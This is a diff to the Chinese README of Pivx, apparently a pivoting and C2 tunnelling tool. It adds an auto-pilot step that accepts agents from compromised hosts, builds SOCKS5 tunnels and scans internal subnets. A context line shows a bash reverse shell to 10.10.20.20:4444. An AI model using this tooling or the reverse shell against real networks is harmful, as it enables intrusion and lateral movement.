@@ -105,6 +105,27 @@ Pivx 禁用了 gVisor 的 SYN-Cookie 机制，防止 netstack 在不创建状态
 
 ## 🚀 快速开始
 
+### Auto-Pilot CLI（推荐）
+
+一条命令启动 C2、等待 Agent 连接、自动配置 SOCKS5 + 隧道 + 路由、扫描内部网络并进入代理化 Shell：
+
+```bash
+sudo server/venv/bin/python pivx-autopilot.py
+```
+
+脚本将自动完成以下步骤：
+1. 在 `ws://0.0.0.0:8765` 上启动 WebSocket 监听器
+2. 等待 Agent 连接（在被攻陷主机上部署 Agent）
+3. 自动启动 SOCKS5（`127.0.0.1:1080`）、隧道（`pivx0`）和路由
+4. 扫描所有已发现的子网并显示存活主机
+5. 打开带有预配置别名的交互式 Shell：
+
+```bash
+pivx ~/Pivx $ pc curl http://10.10.20.5/         # proxychains 快捷方式
+pivx ~/Pivx $ pscan -p 22,80 10.10.20.0/24       # proxychains + nmap
+pivx ~/Pivx $ pscurl http://10.10.20.5/           # curl 通过 SOCKS5
+```
+
 ### 1) 服务端（Python，Linux/WSL2）
 
 > **Kali Linux 及新版发行版注意事项：**Python 3.11+ 将系统包标记为 `externally-managed-environment`，会阻止全局 `pip install`。Pivx 使用**虚拟环境（`venv`）**来避免此问题。`install.sh` 脚本会自动创建虚拟环境。
@@ -345,6 +366,7 @@ bash -i >& /dev/tcp/10.10.20.20/4444 0>&1
 ```
 Pivx/
 ├── Makefile                  # 交叉编译（linux/amd64、arm64、win/amd64）
+├── pivx-autopilot.py         # Auto-Pilot CLI（一键配置）
 ├── assets/                   # Logo 和视觉资源
 │   └── logo.svg
 ├── agent/                    # Go Agent
